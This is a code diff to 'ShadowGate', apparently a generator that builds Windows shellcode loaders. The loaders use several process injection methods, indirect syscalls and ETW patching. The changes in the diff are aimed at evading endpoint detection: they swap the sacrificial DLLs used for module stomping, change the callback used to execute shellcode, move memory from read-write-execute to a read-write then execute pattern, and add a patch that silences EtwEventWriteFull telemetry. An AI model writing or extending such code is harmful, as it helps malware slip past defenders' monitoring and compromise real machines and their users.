@@ -26,7 +26,7 @@ from .config import (
     STRINGS_NONE, STRINGS_DJB2, STRINGS_XOR, STRINGS_STACK,
     ENCRYPT_XOR, ENCRYPT_AES, ENCRYPT_CASCADE,
     ENCODE_UUID, ENCODE_MAC, ENCODE_IPV4, ENCODE_RAW,
-    INJECT_STOMP, INJECT_EARLYBIRD, INJECT_THREADPOOL,
+    INJECT_STOMP, INJECT_EARLYBIRD, INJECT_REMOTETHREAD, INJECT_THREADPOOL,
     INJECT_HOLLOWING, INJECT_MAPPING
 )
 from .crypto import CryptoEngine, CRYPTO_AVAILABLE
@@ -75,7 +75,7 @@ def colored(text: str, color: str) -> str:
             import ctypes
             kernel32 = ctypes.windll.kernel32
             kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
-        except:
+        except Exception:
             return text
     return f"{color}{text}{Colors.ENDC}"
 
@@ -265,7 +265,8 @@ class CodeGenerator:
         inject_map = {
             INJECT_STOMP: "INJECT_STOMP",
             INJECT_EARLYBIRD: "INJECT_EARLYBIRD",
-            INJECT_THREADPOOL: "INJECT_THREADPOOL",
+            INJECT_REMOTETHREAD: "INJECT_REMOTETHREAD",
+            "threadpool": "INJECT_REMOTETHREAD",
             INJECT_HOLLOWING: "INJECT_HOLLOWING",
             INJECT_MAPPING: "INJECT_MAPPING",
         }
@@ -480,6 +481,9 @@ int main(int argc, char** argv) {{
     // Phase 7: Shellcode Decryption
     // ========================================================================
     LOG_PHASE("Phase 7: Shellcode Decryption");
+    
+    // Decode runtime keys from their build-time obfuscated form
+    DeriveAllKeys();
     
     unsigned char* pDecrypted = NULL;
     SIZE_T decryptedLen = 0;
@@ -1285,6 +1289,11 @@ PVOID GetNtdllFromPEB(VOID) {{
 }}
 
 PVOID GetFreshNtdll(VOID) {{
+    // NOTE: This implementation returns the PEB-mapped NTDLL.
+    // A future improvement should load a truly clean copy via the
+    // \\KnownDlls\\ntdll.dll section object to avoid hooked Win32 file APIs
+    // (CreateFileA/ReadFile), though EDR hooks on those calls are still
+    // visible in telemetry even when the resulting content is clean.
     return GetNtdllFromPEB();
 }}
 
@@ -1505,7 +1514,7 @@ extern "C" {
 
 #define INJECT_STOMP        1
 #define INJECT_EARLYBIRD    2
-#define INJECT_THREADPOOL   3
+#define INJECT_REMOTETHREAD 3
 #define INJECT_HOLLOWING    4
 #define INJECT_MAPPING      5
 
@@ -1534,7 +1543,7 @@ BOOL PerformInjection(PINJECTION_CONTEXT pCtx);
 // Individual injection methods
 BOOL InjectModuleStomp(PINJECTION_CONTEXT pCtx);
 BOOL InjectEarlyBird(PINJECTION_CONTEXT pCtx);
-BOOL InjectThreadPool(PINJECTION_CONTEXT pCtx);
+BOOL InjectRemoteThread(PINJECTION_CONTEXT pCtx);
 BOOL InjectProcessHollowing(PINJECTION_CONTEXT pCtx);
 BOOL InjectMapping(PINJECTION_CONTEXT pCtx);
 
@@ -1553,7 +1562,7 @@ BOOL ExecuteViaCallback(PVOID pShellcode);
         """Generate injection.cpp with all 5 methods"""
         return r'''/*
  * ShadowGate - Injection Methods
- * Includes: Stomp, EarlyBird, ThreadPool, Hollowing, Mapping
+ * Includes: Stomp, EarlyBird, RemoteThread, Hollowing, Mapping
  */
 
 #include "injection.h"
@@ -1597,7 +1606,7 @@ DWORD FindProcessByName(LPCWSTR wszProcessName) {
 // ============================================================================
 
 BOOL ExecuteViaCallback(PVOID pShellcode) {
-    return EnumSystemLocalesA((LOCALE_ENUMPROCA)pShellcode, LCID_SUPPORTED);
+    return EnumCalendarInfoA((CALINFO_ENUMPROCA)pShellcode, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SSHORTDATE);
 }
 
 // ============================================================================
@@ -1609,9 +1618,12 @@ BOOL InjectModuleStomp(PINJECTION_CONTEXT pCtx) {
     LOG_INFO("Module Stomping: Loading sacrificial DLL...");
 #endif
     
-    HMODULE hModule = LoadLibraryA("amsi.dll");
+    HMODULE hModule = LoadLibraryA("colorui.dll");
     if (!hModule) {
-        hModule = LoadLibraryA("dbghelp.dll");
+        hModule = LoadLibraryA("msftedit.dll");
+    }
+    if (!hModule) {
+        hModule = LoadLibraryA("xpsservices.dll");
     }
     if (!hModule) {
 #if DEBUG_BUILD
@@ -1788,10 +1800,10 @@ BOOL InjectEarlyBird(PINJECTION_CONTEXT pCtx) {
 }
 
 // ============================================================================
-// Method 3: Thread Pool (Remote Thread)
+// Method 3: Remote Thread (NtCreateThreadEx-based)
 // ============================================================================
 
-BOOL InjectThreadPool(PINJECTION_CONTEXT pCtx) {
+BOOL InjectRemoteThread(PINJECTION_CONTEXT pCtx) {
     DWORD dwPid = pCtx->dwTargetPid;
     
     if (dwPid == 0) {
@@ -1821,7 +1833,7 @@ BOOL InjectThreadPool(PINJECTION_CONTEXT pCtx) {
     }
     
 #if DEBUG_BUILD
-    LOG_INFO("Thread Pool: Target PID: %lu", dwPid);
+    LOG_INFO("Remote Thread: Target PID: %lu", dwPid);
 #endif
     
     OBJECT_ATTRIBUTES oa = { sizeof(oa) };
@@ -1935,7 +1947,7 @@ BOOL InjectProcessHollowing(PINJECTION_CONTEXT pCtx) {
     
     PrepareNextSyscall(IDX_NtAllocateVirtualMemory);
     NTSTATUS status = NtAllocateVirtualMemory(pi.hProcess, &pRemoteBase, 0, &regionSize,
-                                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     
     if (!NT_SUCCESS(status)) {
 #if DEBUG_BUILD
@@ -1961,6 +1973,12 @@ BOOL InjectProcessHollowing(PINJECTION_CONTEXT pCtx) {
         CloseHandle(pi.hThread);
         return FALSE;
     }
+    
+    PVOID pAddr = pRemoteBase;
+    regionSize = pCtx->dwShellcodeSize + 0x1000; // Extra page for alignment
+    ULONG oldProtect = 0;
+    PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+    NtProtectVirtualMemory(pi.hProcess, &pAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
     
     ctx.Rcx = (DWORD64)pRemoteBase;
     
@@ -2113,11 +2131,11 @@ BOOL PerformInjection(PINJECTION_CONTEXT pCtx) {
 #endif
             return InjectEarlyBird(pCtx);
         
-        case INJECT_THREADPOOL:
+        case INJECT_REMOTETHREAD:
 #if DEBUG_BUILD
             LOG_INFO("Using Remote Thread");
 #endif
-            return InjectThreadPool(pCtx);
+            return InjectRemoteThread(pCtx);
         
         case INJECT_HOLLOWING:
 #if DEBUG_BUILD
@@ -2420,6 +2438,35 @@ BOOL PatchETW(VOID) {
 #if DEBUG_BUILD
     LOG_SUCCESS("ETW patched successfully");
 #endif
+    
+    // Also patch EtwEventWriteFull if present (modern Windows telemetry path)
+    PVOID pEtwEventWriteFull = NULL;
+    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
+        LPCSTR szName = (LPCSTR)((PBYTE)pNtdll + pNames[i]);
+        if (strcmp(szName, "EtwEventWriteFull") == 0) {
+            pEtwEventWriteFull = (PVOID)((PBYTE)pNtdll + pFuncs[pOrdinals[i]]);
+            break;
+        }
+    }
+    
+    if (pEtwEventWriteFull) {
+        PVOID pAddr2 = pEtwEventWriteFull;
+        SIZE_T regionSize2 = sizeof(patch);
+        ULONG oldProtect2 = 0;
+        PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+        NTSTATUS status2 = NtProtectVirtualMemory(
+            (HANDLE)-1, &pAddr2, &regionSize2, PAGE_EXECUTE_READWRITE, &oldProtect2);
+        if (NT_SUCCESS(status2)) {
+            memcpy(pEtwEventWriteFull, patch, sizeof(patch));
+            pAddr2 = pEtwEventWriteFull;
+            regionSize2 = sizeof(patch);
+            PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+            NtProtectVirtualMemory((HANDLE)-1, &pAddr2, &regionSize2, oldProtect2, &oldProtect2);
+#if DEBUG_BUILD
+            LOG_SUCCESS("EtwEventWriteFull patched successfully");
+#endif
+        }
+    }
     
     return TRUE;
 }
@@ -2912,11 +2959,12 @@ Resolver Methods:
   hybrid    - PEB first, fresh as fallback
 
 Injection Methods:
-  stomp      - Module stomping (local, overwrites DLL)
-  earlybird  - Early Bird APC (remote, new suspended process)
-  threadpool - Remote thread (remote, existing process)
-  hollowing  - Process hollowing (remote, new process)
-  mapping    - Section mapping (remote, existing process)
+  stomp        - Module stomping (local, overwrites DLL)
+  earlybird    - Early Bird APC (remote, new suspended process)
+  remotethread - Remote thread via NtCreateThreadEx (remote, existing process)
+  threadpool   - Alias for remotethread (backward compatibility)
+  hollowing    - Process hollowing (remote, new process)
+  mapping      - Section mapping (remote, existing process)
         '''
     )
     
@@ -2961,8 +3009,8 @@ Injection Methods:
     # Injection options
     injection_group = parser.add_argument_group('Injection Options')
     injection_group.add_argument('--inject',
-                                 choices=[INJECT_STOMP, INJECT_EARLYBIRD, INJECT_THREADPOOL,
-                                         INJECT_HOLLOWING, INJECT_MAPPING],
+                                 choices=[INJECT_STOMP, INJECT_EARLYBIRD, INJECT_REMOTETHREAD,
+                                         "threadpool", INJECT_HOLLOWING, INJECT_MAPPING],
                                  default=INJECT_EARLYBIRD,
                                  help='Injection method (default: earlybird)')
     
